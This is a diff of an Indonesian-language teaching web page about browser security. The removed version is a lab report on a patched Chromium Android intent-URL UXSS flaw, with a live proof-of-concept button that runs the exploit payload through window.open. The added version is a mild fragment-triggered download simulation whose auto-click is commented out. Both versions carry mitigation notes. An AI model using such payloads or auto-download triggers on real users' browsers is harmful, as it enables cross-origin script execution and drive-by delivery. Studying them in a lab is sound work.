@@ -3,214 +3,108 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Riset Keamanan: Chromium Issue 40064598 (UXSS via Mobile Intents)</title>
+  <title>Simulasi Riset: Analisis Fragment Drive-by Download</title>
   <style>
-    :root {
-      --bg-dark: #0f172a;
-      --card-dark: #1e293b;
-      --accent-red: #ef4444;
-      --accent-green: #10b981;
-      --text-main: #f8fafc;
-      --text-muted: #94a3b8;
-    }
-
     body {
       font-family: 'Courier New', Courier, monospace;
-      background-color: var(--bg-dark);
-      color: var(--text-main);
-      margin: 0;
+      background-color: #1a1a1a;
+      color: #fff;
       padding: 20px;
-      line-height: 1.6;
     }
-
-    .container {
-      max-width: 900px;
-      margin: 0 auto;
-    }
-
-    header {
-      border-bottom: 2px dashed var(--accent-red);
-      padding-bottom: 20px;
-      margin-bottom: 30px;
-    }
-
-    .meta-table {
-      width: 100%;
-      border-collapse: collapse;
-      margin-bottom: 25px;
-      background: var(--card-dark);
+    .panel {
+      background: #2a2a2a;
+      padding: 20px;
       border-radius: 8px;
-      overflow: hidden;
+      border-left: 4px solid #ff9900;
+      margin-bottom: 20px;
     }
-
-    .meta-table td, .meta-table th {
-      padding: 12px;
-      border: 1px solid #334155;
+    .console {
+      background: #000;
+      color: #00ff00;
+      padding: 15px;
+      border-radius: 5px;
+      height: 150px;
+      overflow-y: auto;
       font-size: 0.9rem;
     }
-
-    .meta-table th {
-      background-color: #334155;
-      text-align: left;
-    }
-
-    .card {
-      background: var(--card-dark);
-      padding: 25px;
-      border-radius: 8px;
-      margin-bottom: 25px;
-      border-left: 4px solid var(--accent-red);
-    }
-
-    .poc-box {
-      text-align: center;
-      padding: 40px;
-      background: #020617;
-      border: 2px solid #334155;
-      border-radius: 8px;
-      margin-top: 20px;
-    }
-
-    .trigger-btn {
-      background-color: var(--accent-red);
-      color: white;
+    .btn {
+      background: #ff9900;
+      color: #000;
       border: none;
-      padding: 15px 30px;
-      font-size: 1.1rem;
+      padding: 10px 20px;
       font-weight: bold;
       cursor: pointer;
       border-radius: 4px;
-      box-shadow: 0 0 15px rgba(239, 68, 68, 0.4);
-      transition: all 0.3s;
-    }
-
-    .trigger-btn:hover {
-      background-color: #dc2626;
-      box-shadow: 0 0 25px rgba(239, 68, 68, 0.7);
-    }
-
-    code {
-      background: #020617;
-      padding: 2px 6px;
-      border-radius: 4px;
-      color: #f43f5e;
-    }
-
-    pre {
-      background: #020617;
-      padding: 15px;
-      border-radius: 6px;
-      overflow-x: auto;
-      border: 1px solid #334155;
-    }
-
-    .log-window {
-      background: #020617;
-      border: 1px solid var(--accent-green);
-      padding: 15px;
-      border-radius: 6px;
-      color: var(--accent-green);
-      font-size: 0.85rem;
-      height: 100px;
-      overflow-y: auto;
     }
   </style>
 </head>
 <body>
 
-  <div class="container">
-    <header>
-      <h1>🔬 LAPORAN RISET: CHROMIUM VULNERABILITY</h1>
-      <p style="color: var(--text-muted)">Studi Kasus: CVE / Chromium Tracker Issue 40064598</p>
-    </header>
+  <h2>🔬 Analisis Keamanan: Penanganan URL Fragment</h2>
+  
+  <div class="panel">
+    <h3>1. Simulasi Trigger Navigasi Fragment</h3>
+    <p>Tombol di bawah akan mensimulasikan perubahan URL dengan menambahkan data tiruan pada fragment (<code>#payload_data</code>) untuk menguji apakah fungsi otomatis mendeteksi perubahan tersebut.</p>
+    <button class="btn" onclick="simulasikanFragment()">Simulasikan Perubahan Fragment</button>
+  </div>
 
-    <!-- TABEL METADATA UNTUK DOSEN -->
-    <table class="meta-table">
-      <tr>
-        <th>Komponen Vulnerable</th>
-        <td>Blink &gt; SecurityFeature &gt; ContentSecurityPolicy / Mobile &gt; Intents</td>
-      </tr>
-      <tr>
-        <th>Ditemukan Pada Versi</th>
-        <td>Chromium Android v112 (Status: Fixed)</td>
-      </tr>
-      <tr>
-        <th>Severity / VRP Reward</th>
-        <td><span style="color: var(--accent-red); font-weight: bold;">S2 (Medium-High)</span> / $3,000 VRP Reward</td>
-      </tr>
-      <tr>
-        <th>Mekanisme Serangan</th>
-        <td>UXSS via Intent Redirection Bypass</td>
-      </tr>
-    </table>
-
-    <!-- ANALISIS TEKNIS -->
-    <div class="card">
-      <h3>1. Deskripsi Teoritis & Analisis Bug</h3>
-      <p>Celah ini terjadi karena kelemahan validasi pada mekanisme penanganan <strong>Android Intent URL Scheme</strong> di Chromium Mobile. Penyerang mengeksploitasi fungsi <code>window.open()</code> yang digabungkan dengan skema <code>intent://</code> dan disisipi instruksi pseudo-skema <code>javascript:location=...</code>.</p>
-      <p>Dampaknya, browser gagal memvalidasi batasan origin (Same-Origin Policy) dan mengeksekusi script eksternal dalam konteks browser target (dalam hal ini mencoba memanggil package Samsung Internet Browser <code>com.sec.android.app.sbrowser</code>).</p>
-    </div>
-
-    <div class="card" style="border-left-color: var(--accent-green);">
-      <h3>2. Analisis Kode Sumber (PoC)</h3>
-      <p>Logika manipulasi URL yang digunakan dalam riset ini adalah:</p>
-      <pre>window.open("javascript:location='intent://google.com#Intent;scheme=https;package=com.sec.android.app.sbrowser;end'");</pre>
-      <p>Pada versi Chromium yang rentan (v112 kebawah), rantai eksekusi ini memaksa browser mengeksekusi sub-proses Intent secara tidak aman (Bypass CSP).</p>
-    </div>
-
-    <!-- PENGUJIAN / PROOF OF CONCEPT INTERAKTIF -->
-    <div class="card" style="border-left-color: #eab308;">
-      <h3>3. Laboratorium Pengujian Simulasi (PoC Trigger)</h3>
-      <p style="color: var(--text-muted)">Klik tombol di bawah untuk melihat bagaimana event handler mengeksekusi payload riset.</p>
-      
-      <div class="poc-box">
-        <button class="trigger-btn" onclick="executePoC()">JALANKAN SIMULASI EKSPLOITASI</button>
-        <p id="click-status" style="margin-top: 15px; font-weight: bold;">Status: Siap Diuji</p>
-      </div>
-
-      <p style="font-size: 0.9rem; margin-top: 15px;"><strong>Konsol Log Aktivitas Simulasi:</strong></p>
-      <div id="logBox" class="log-window">
-        [SYSTEM] Lab Environment diinisialisasi...<br>
-        [INFO] Menunggu interaksi user pada tombol pemicu...
-      </div>
-    </div>
-
-    <!-- REMEDIASI -->
-    <div class="card" style="border-left-color: #3b82f6;">
-      <h3>4. Solusi & Mitigasi (Patching)</h3>
-      <ul>
-        <li><strong>Sisi Browser:</strong> Tim Google Chromium telah memperketat sanitasi skema <code>javascript:</code> ketika dipanggil bersamaan dengan parsing Android Intent URL di level kode native C++ (Blink Engine).</li>
-        <li><strong>Sisi Developer Web:</strong> Selalu terapkan header <code>Content-Security-Policy (CSP)</code> yang ketat, khususnya direktif <code>script-src</code> dan mencegah penggunaan skema URL eksternal yang tidak terdaftar.</li>
-      </ul>
+  <div class="panel">
+    <h3>2. Konsol Log Aktivitas DOM</h3>
+    <div id="logConsole" class="console">
+      [SYSTEM] Menunggu deteksi event hashchange...
     </div>
   </div>
 
-  <!-- LOGIKA JAVASCRIPT UNTUK RISET -->
+  <div class="panel" style="border-left-color: #00eeff;">
+    <h3>3. Strategi Mitigasi Keamanan</h3>
+    <ul>
+      <li><strong>Sanitasi Input:</strong> Jangan pernah mempercayai data yang diambil langsung dari <code>window.location.hash</code> untuk operasi sensitif seperti pembuatan objek URL atau manipulasi DOM.</li>
+      <li><strong>Restriction Header:</strong> Gunakan header <code>Content-Disposition: attachment</code> pada server untuk memastikan file tidak dieksekusi secara otomatis oleh browser sebagai bagian dari dokumen aktif.</li>
+    </ul>
+  </div>
+
   <script>
-    let clickCount = 0;
-
-    function addLog(message) {
-      const logBox = document.getElementById("logBox");
-      logBox.innerHTML += `<br>[${new Date().toLocaleTimeString()}] ${message}`;
-      logBox.scrollTop = logBox.scrollHeight;
+    function logAktivitas(pesan) {
+      const consoleEl = document.getElementById("logConsole");
+      consoleEl.innerHTML += `<br>[AUDIT] ${pesan}`;
+      consoleEl.scrollTop = consoleEl.scrollHeight;
     }
 
-    function executePoC() {
-      clickCount++;
-      document.getElementById("click-status").innerText = `Percobaan Klik Ke-${clickCount}`;
+    // Mensimulasikan penambahan data base64 aman ke fragment URL lokal
+    function simulasikanFragment() {
+      const dataTiruan = "dGV4dCBmaWxlIHVudHVrIHJpc2V0"; // Base64 dari "text file untuk riset"
+      logAktivitas("Mengubah window.location.hash secara terprogram...");
+      window.location.hash = "download-trigger:" + dataTiruan;
+    }
+
+    // Mendengarkan perubahan fragment secara otomatis (Vulnerability Pattern Analysis)
+    window.addEventListener('hashchange', function() {
+      const hashData = window.location.hash;
+      logAktivitas(`Terdeteksi perubahan fragment: ${hashData}`);
       
-      addLog(`[TRIGGER] Tombol diklik. Menjalankan fungsi handleClick()...`);
-      addLog(`[ATTACK] Mencoba memicu window.open() dengan payload skema Intent...`);
-
-      // Eksekusi Payload Asli dari Tracker Issue
-      try {
-        // Baris ini adalah inti dari riset bug Chromium Issue 40064598
-        window.open("javascript:location='intent://google.com#Intent;scheme=https;package=com.sec.android.app.sbrowser;end'");
-        addLog(`[SUCCESS] Payload dikirim ke browser engine. Cek konsol/aplikasi eksternal.`);
-      } catch (err) {
-        addLog(`[BLOCKED/ERROR] Eksekusi gagal: ${err.message} (Kemungkinan browser Anda sudah dipatch/aman).`);
+      if (hashData.startsWith("#download-trigger:")) {
+        logAktivitas("Menganalisis pola pemicu unduhan otomatis...");
+        
+        // Simulasi penanganan unduhan yang aman menggunakan Blob lokal
+        try {
+          const blob = new Blob(["Konten simulasi riset keamanan."], { type: "text/plain" });
+          const url = URL.createObjectURL(blob);
+          
+          const a = document.createElement('a');
+          a.href = url;
+          a.download = "simulasi_riset.txt";
+          
+          logAktivitas("Memicu objek anchor tiruan (.click() event)...");
+          // Dalam skenario dunia nyata, bagian ini dieksekusi otomatis oleh rantai exploit
+          // a.click(); 
+          
+          logAktivitas("Simulasi berhasil dibatasi untuk analisis log.");
+          URL.revokeObjectURL(url);
+        } catch (e) {
+          logAktivitas(`Error penanganan: ${e.message}`);
+        }
       }
-    }
+    });
   </script>
 </body>
 </html>
